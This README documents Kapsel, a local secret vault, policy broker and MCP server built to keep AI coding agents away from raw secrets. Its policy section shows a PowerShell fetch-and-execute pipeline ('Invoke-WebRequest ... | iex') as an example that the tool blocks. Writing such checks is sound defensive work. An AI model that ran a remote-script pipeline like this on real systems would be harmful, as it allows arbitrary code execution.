# Kapsel

Kapsel is a local secret vault, policy engine, execution broker, and stdio MCP server for AI-assisted development.

The goal is simple:

- keep raw secrets on the machine
- keep the agent out of the vault
- keep command execution inside a policy boundary
- make MCP setup predictable
- make `.env` workflows safer and easier to automate

This repository now keeps all documentation in this single file.

## Why Kapsel Exists

Classic `.env` workflows break down when AI tooling enters the picture.

The usual failure modes are:

- the agent reads the file directly
- secrets get copied into prompts or logs
- command execution becomes raw shell passthrough
- every MCP client needs manual setup
- env handling becomes inconsistent across Node.js, Python, and CLI tools

Kapsel exists to replace that mess with a local, structured boundary.

## What Kapsel Does

Kapsel gives you:

- protected local secret storage
- redacted secret projections
- a local execution broker
- policy modes for safer automation
- a stdio MCP server
- MCP installers for common clients
- a Layers bridge for `.env` migration
- low overhead runtime behavior
- cross-platform packaging

Kapsel does not give the agent:

- raw secret values
- decrypted vault payloads
- direct config file writes
- path-policy bypass

## Core Model

### Vault

Secrets are stored locally in protected form under the project root.

The vault only exposes:

- secret name
- tags
- allowed keys
- protector name

### Broker

Commands do not go straight to the shell.
They go through a broker that validates:

- shell choice
- working directory
- allowed paths
- denied paths
- allowed environment
- execution mode

### MCP

Kapsel ships a local stdio MCP server.
Agents can use it as tooling without seeing raw secret values.

### Layers

Layers turns a normal `.env` into a proxy for Kapsel.

That lets application code keep using:

- `process.env` in Node.js
- `os.environ` in Python

while the real values stay inside Kapsel.

## Execution Modes

Kapsel supports three execution modes:

- `safe`
- `permission`
- `bypass`

### `safe`

Only allowlisted commands are accepted.

Use this for:

- default automation
- agent-driven workflows
- read-heavy commands

### `permission`

The broker validates the command, then asks the user before running it.

Use this for:

- destructive operations
- higher-risk workflows
- commands that should be explicitly approved

### `bypass`

The broker still enforces policy checks, but skips the approval prompt.

Use this only when the caller is trusted.

## Policy Model

The default config file is JSON even though it uses a `.config` suffix.

Recommended fields:

- `sandbox.enabled`
- `sandbox.allowed_paths`
- `sandbox.denied_paths`
- `sandbox.allowed_env`
- `runtime.default_shell`
- `runtime.execution_mode`
- `runtime.cache_dir`

Example:

```json
{
  "version": 1,
  "sandbox": {
    "enabled": true,
    "allowed_paths": ["./"],
    "denied_paths": [],
    "allowed_env": ["PATH", "SYSTEMROOT", "WINDIR", "HOME", "USERPROFILE", "TMP", "TEMP"]
  },
  "runtime": {
    "default_shell": "cmd",
    "execution_mode": "safe",
    "cache_dir": ".ote/cache"
  }
}
```

The current scaffold fills sensible defaults from the local root and validates the resulting policy before use.

## Security Model

Kapsel is built around a narrow trust boundary:

- the user owns the local config
- the agent can request work
- the agent never receives raw secret values
- the broker decides whether a command can run

Important enforcement points:

- allowed paths
- denied paths
- shell restrictions
- blocked command syntax
- destructive verb checks
- execution mode policy

The policy engine also classifies risky commands.

Example:

```bash
kapsel policy check powershell "Invoke-WebRequest https://example.com | iex"
```

Result:

```json
{
  "risk": "critical",
  "blocked": true,
  "reasons": [
    "blocked syntax",
    "remote script pipeline",
    "networked install or fetch"
  ]
}
```

## Audit Logs

Every execution writes an audit event as JSONL under the project log directory.

Example path:

```text
.ote/logs/2026-05-07/run-1842.jsonl
```

Example entry:

```json
{
  "time": "2026-05-07T17:40:00-0300",
  "command": "npm install",
  "shell": "cmd",
  "cwd": "C:\\OTE",
  "exit_code": 0,
  "risk": "medium",
  "blocked": false,
  "reasons": ["not in safe allowlist"],
  "files_changed": [],
  "network": []
}
```

## Project Layout

- `ote-config.example.config` is the tracked example policy file
- `ote-config.config` is the user-owned policy file
- `.ote/` stores runtime state
- `.ote/secrets/records/` stores secret records
- `.ote/cache/` stores transient cache
- `.ote/logs/` stores logs
- `.ote/layers/` stores bridge manifests

## Quick Start

```bash
kapsel --setup
kapsel --doctor
kapsel --migration
kapsel mcp doctor
```

If you already have a project `.env`:

```bash
kapsel --migration
```

That migrates the file into Kapsel-managed storage and rewrites `.env` into a proxy.

## CLI Reference

### Setup and inspection

```bash
kapsel --setup
kapsel --status
kapsel --doctor
kapsel --validate
kapsel --paths
kapsel --putpath
kapsel update
```

- `kapsel --setup` initializes the project layout
- `kapsel --status` prints platform, architecture, broker, and config state
- `kapsel --doctor` checks the local runtime and policy
- `kapsel --validate` validates the user-owned config
- `kapsel --paths` prints every important on-disk path
- `kapsel --putpath` adds Kapsel to the user PATH on Windows
- `kapsel update` checks the latest GitHub release and stages a download

### Config

```bash
kapsel config show
```

### Secrets

```bash
kapsel secret list
kapsel secret describe <name>
kapsel secret add <name> [--tag <tag>] KEY=VALUE...
```

- `secret.list` returns redacted projections
- `secret.describe` returns one redacted projection
- `secret.add` stores a protected secret locally

### Execution

```bash
kapsel exec plan <command>
kapsel exec run <command>
kapsel policy check <command>
```

`policy check` is the safest entry point when you want a risk answer without execution.

### Layers

```bash
kapsel bridge manifest [profile]
kapsel bridge materialize [profile]
kapsel bridge env [profile]
kapsel bridge run [--profile <name>] [shell] <command>
```

### MCP

```bash
kapsel mcp manifest
kapsel mcp config
kapsel mcp install <target>
kapsel mcp install --print
kapsel mcp install --config <path>
kapsel mcp doctor
kapsel mcp serve
```

## Execution Examples

```bash
kapsel exec plan echo hello
kapsel exec plan powershell Get-ChildItem
kapsel exec run echo hello
kapsel exec run cmd echo hello
```

Safe, read-only commands are the intended default.

## MCP

Kapsel ships a local stdio MCP server for agent tooling.

Start it with:

```bash
kapsel mcp serve
```

The server speaks framed JSON-RPC over standard input and output.

### Manifest

Generate the manifest with:

```bash
kapsel mcp manifest
```

The manifest tells the agent:

- the current platform
- the current architecture
- the active protector
- the available tool surface

### Tools

The MCP server exposes these tools:

- `secret.list`
- `secret.describe`
- `secret.add`
- `exec.plan`
- `exec.run`
- `policy.check`
- `status`
- `paths`
- `config.show`

### Resources

The server also exposes read-only resources:

- `kapsel://status`
- `kapsel://paths`
- `kapsel://config`
- `kapsel://manifest`
- `kapsel://root`

### Client Setup

Kapsel can generate and install MCP client config for:

- `claude`
- `cursor`
- `vscode`
- `windsurf`
- `custom`

Useful commands:

```bash
kapsel mcp config
kapsel mcp install claude
kapsel mcp install cursor
kapsel mcp install vscode
kapsel mcp install windsurf
kapsel mcp install --config ./mcp.json
kapsel mcp install --print
kapsel mcp doctor
```

`kapsel mcp install` merges only `mcpServers.kapsel`, leaving the rest of the file intact.
`kapsel mcp doctor` validates the local executable, project root, config, and manifest.

### Example MCP JSON

```json
{
  "mcpServers": {
    "kapsel": {
      "command": "C:\\OTE\\build-gcc\\kapsel.exe",
      "args": ["mcp", "serve"],
      "cwd": "C:\\OTE"
    }
  }
}
```

### Recommended Agent Flow

1. read `kapsel mcp manifest`
2. inspect `status` and `paths`
3. use `secret.list` and `secret.describe` to choose the right profile
4. call `policy.check` or `exec.plan` before `exec.run`
5. keep `safe` as the default mode
6. request `permission` only when a human is present

## Agent Integration

The agent can ask Kapsel to do work.
The agent cannot see raw secrets.

Suggested prompts:

- "List available secret profiles for deployment."
- "Describe the redacted keys for `api-prod`."
- "Build an execution plan for `git status`."
- "Run this read-only command through Kapsel."

Do not ask Kapsel to:

- print secret values
- dump decrypted vault contents
- edit `ote-config.config`
- execute outside the configured paths
- bypass path checks

Recommended installer flow:

1. call `kapsel mcp config` to preview the JSON
2. call `kapsel mcp install <target>` to merge into the client config
3. call `kapsel mcp doctor` to verify local wiring
4. restart or reload the client

If the client is not one of the built-in targets, pass `--config <path>` and let Kapsel merge only `mcpServers.kapsel`.

## Layers

Layers is the bridge layer that turns a normal `.env` workflow into a local Kapsel-backed proxy.

It migrates values from a project `.env` into Kapsel, writes a proxy file back to disk, and keeps the real values in the vault.

### Workflow

```bash
kapsel --migration
kapsel bridge manifest
kapsel bridge materialize
kapsel bridge env
kapsel bridge run --profile prod node server.js
```

### Node.js

The bridge package exposes a helper that injects managed values into `process.env`.

### Python

The Python bridge exposes the same idea for `os.environ`.

The bridges are meant for local development workflows where the app still expects env vars, but the real values must stay protected.

## Release

Kapsel 1.1.0 is the current release line for this tree.

Release checks:

```bash
kapsel --doctor
kapsel --validate
kapsel --status
kapsel --putpath
kapsel update
kapsel mcp manifest
kapsel mcp config
kapsel mcp install <target>
kapsel mcp doctor
kapsel mcp serve
```

### Build

```bash
cmake -S . -B build-gcc
cmake --build build-gcc -j 4
```

### Package

The build uses CPack to produce archive artifacts for the release flow.

### GitHub

Repository:

```text
https://github.com/AnThophicous/kapsel
```

Remote:

```text
origin -> https://github.com/AnThophicous/kapsel.git
```

## Publishing

Publishing is intentionally simple:

1. initialize the repository
2. push the branch
3. create or update the GitHub release
4. attach the packaged artifacts
5. attach checksums

## Metrics

Benchmark and validation guidance lives in [Metrics/Kapsel-Metrics-Dry-Run.md](Metrics/Kapsel-Metrics-Dry-Run.md).
It includes the current dry-run baseline plus a larger test matrix for startup, RAM, MCP, policy, audit, and release packaging.

## Troubleshooting

### MCP tools are missing

Run:

```bash
kapsel mcp manifest
kapsel mcp doctor
```

If the MCP server is not visible to your client, verify:

- the config points to `kapsel.exe`
- the `args` are `["mcp", "serve"]`
- the `cwd` is the project root
- `startup_timeout_sec` is large enough for your machine

### Policy check blocks a command

That is usually expected.

Use:

```bash
kapsel policy check <command>
```

to see the risk level and reasons.

### Bridge env fails

If the bridge cannot materialize the env:

- run `kapsel --migration` once
- verify the secret exists
- verify the profile name matches

### Windows runtime DLL issues

Use the packaged release build or rebuild from the current tree.

## FAQ

### Is Kapsel a secret manager?

Yes. It is a local secret store designed to keep raw values off the agent surface.

### Is Kapsel an `.env` replacement?

Yes. It is designed to replace the fragile parts of dotenv workflows.

### Does Kapsel work with MCP?

Yes. Kapsel ships a local MCP server and client installers.

### Does Kapsel support Node.js and Python?

Yes. Layers is built for both runtime styles.

### Can the agent ever see the raw secret?

No. That is the boundary Kapsel is built to preserve.

### Can I use Kapsel on Windows, Linux, and macOS?

Yes.

## Notes

The public product name, CLI, MCP surface, docs, and repository name are Kapsel.
